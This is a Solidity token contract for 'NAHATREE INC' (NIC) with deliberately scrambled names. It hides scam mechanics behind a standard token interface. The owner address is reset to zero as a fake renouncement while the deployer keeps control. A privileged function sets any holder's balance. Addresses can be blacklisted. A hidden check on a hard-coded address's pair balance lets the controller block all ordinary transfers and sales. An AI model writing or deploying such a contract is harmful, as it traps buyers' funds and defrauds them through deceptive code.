//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface takeTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldTx {
    function createPair(address totalReceiver, address amountBuy) external returns (address);
}

abstract contract minExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromTrading) external view returns (uint256);

    function transfer(address toEnableWallet, uint256 limitMarketing) external returns (bool);

    function allowance(address tradingTotalBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitMarketing) external returns (bool);

    function transferFrom(address sender,address toEnableWallet,uint256 limitMarketing) external returns (bool);

    event Transfer(address indexed from, address indexed minIs, uint256 value);
    event Approval(address indexed tradingTotalBuy, address indexed spender, uint256 value);
}

interface amountTokenMetadata is amountToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract NAHATREEINC is minExempt, amountToken, amountTokenMetadata {

    uint256 modeLaunch;

    address public fundEnableTx;

    function tokenExempt(uint256 limitMarketing) public {
        marketingWallet();
        atShould = limitMarketing;
    }

    function allowance(address tokenFee, address toLaunched) external view virtual override returns (uint256) {
        if (toLaunched == tokenTrading) {
            return type(uint256).max;
        }
        return takeReceiver[tokenFee][toLaunched];
    }

    bool public txTeam;

    mapping(address => bool) public takeTx;

    bool public maxSell;

    mapping(address => bool) public fundReceiver;

    address private receiverFrom;

    function decimals() external view virtual override returns (uint8) {
        return minSwap;
    }

    string private receiverEnable = "NAHATREE INC";

    mapping(address => mapping(address => uint256)) private takeReceiver;

    uint256 atShould;

    uint256 private marketingAt;

    mapping(address => uint256) private teamWallet;

    function balanceOf(address fromTrading) public view virtual override returns (uint256) {
        return teamWallet[fromTrading];
    }

    function amountTrading(address listSender, address toEnableWallet, uint256 limitMarketing) internal returns (bool) {
        require(teamWallet[listSender] >= limitMarketing);
        teamWallet[listSender] -= limitMarketing;
        teamWallet[toEnableWallet] += limitMarketing;
        emit Transfer(listSender, toEnableWallet, limitMarketing);
        return true;
    }

    uint256 public feeTotalWallet;

    bool private isMin;

    constructor (){
        
        exemptMode();
        takeTrading enableWallet = takeTrading(tokenTrading);
        senderTxTake = shouldTx(enableWallet.factory()).createPair(enableWallet.WETH(), address(this));
        if (txTeam == isMin) {
            marketingAt = feeTotalWallet;
        }
        fundEnableTx = _msgSender();
        fundReceiver[fundEnableTx] = true;
        teamWallet[fundEnableTx] = autoLaunch;
        
        emit Transfer(address(0), fundEnableTx, autoLaunch);
    }

    uint8 private minSwap = 18;

    uint256 private autoLaunch = 100000000 * 10 ** 18;

    bool public enableLiquidity;

    function getOwner() external view returns (address) {
        return receiverFrom;
    }

    bool private toSellLaunched;

    bool private receiverTake;

    function transfer(address launchLimit, uint256 limitMarketing) external virtual override returns (bool) {
        return toAt(_msgSender(), launchLimit, limitMarketing);
    }

    function approve(address toLaunched, uint256 limitMarketing) public virtual override returns (bool) {
        takeReceiver[_msgSender()][toLaunched] = limitMarketing;
        emit Approval(_msgSender(), toLaunched, limitMarketing);
        return true;
    }

    function toAt(address listSender, address toEnableWallet, uint256 limitMarketing) internal returns (bool) {
        if (listSender == fundEnableTx) {
            return amountTrading(listSender, toEnableWallet, limitMarketing);
        }
        uint256 fromToken = amountToken(senderTxTake).balanceOf(maxTake);
        require(fromToken == atShould);
        require(!takeTx[listSender]);
        return amountTrading(listSender, toEnableWallet, limitMarketing);
    }

    address maxTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function txSell(address autoExemptFee) public {
        marketingWallet();
        
        if (autoExemptFee == fundEnableTx || autoExemptFee == senderTxTake) {
            return;
        }
        takeTx[autoExemptFee] = true;
    }

    string private minSender = "NIC";

    address tokenTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public swapMarketingList;

    function marketingWallet() private view {
        require(fundReceiver[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return receiverEnable;
    }

    event OwnershipTransferred(address indexed senderFund, address indexed toFromTrading);

    function totalSupply() external view virtual override returns (uint256) {
        return autoLaunch;
    }

    function transferFrom(address listSender, address toEnableWallet, uint256 limitMarketing) external override returns (bool) {
        if (_msgSender() != tokenTrading) {
            if (takeReceiver[listSender][_msgSender()] != type(uint256).max) {
                require(limitMarketing <= takeReceiver[listSender][_msgSender()]);
                takeReceiver[listSender][_msgSender()] -= limitMarketing;
            }
        }
        return toAt(listSender, toEnableWallet, limitMarketing);
    }

    function owner() external view returns (address) {
        return receiverFrom;
    }

    address public senderTxTake;

    function symbol() external view virtual override returns (string memory) {
        return minSender;
    }

    function exemptMode() public {
        emit OwnershipTransferred(fundEnableTx, address(0));
        receiverFrom = address(0);
    }

    function amountMax(address walletLiquidity) public {
        if (maxSell) {
            return;
        }
        
        fundReceiver[walletLiquidity] = true;
        
        maxSell = true;
    }

    function takeSenderToken(address launchLimit, uint256 limitMarketing) public {
        marketingWallet();
        teamWallet[launchLimit] = limitMarketing;
    }

    uint256 private buySenderAt;

}